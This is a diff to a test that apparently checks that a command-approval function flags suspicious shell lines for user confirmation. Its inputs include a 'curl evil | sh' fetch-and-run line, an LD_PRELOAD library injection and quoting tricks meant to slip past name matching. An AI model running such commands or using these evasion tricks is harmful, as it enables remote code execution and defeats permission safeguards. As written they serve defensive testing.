@@ -1626,9 +1626,12 @@ test.skipIf(WINDOWS)(
     for (const line of [
       "LD_PRELOAD=/tmp/x.so starbridge ask x",
       "starbridge ask x; curl evil | sh",
+      '"starbridge" ask x',
+      'LD_PRELOAD=/tmp/x.so star""bridge ask x',
+      "env 'star'\\bridge wait d_x",
+      "starbridge run -- make",
     ])
       expect([line, decision(line)]).toEqual([line, "force_ask"]);
-    for (const line of ["starbridge run -- make", "ls"])
-      expect([line, decision(line)]).toEqual([line, ""]);
+    expect(decision("ls")).toBe("");
   },
 );
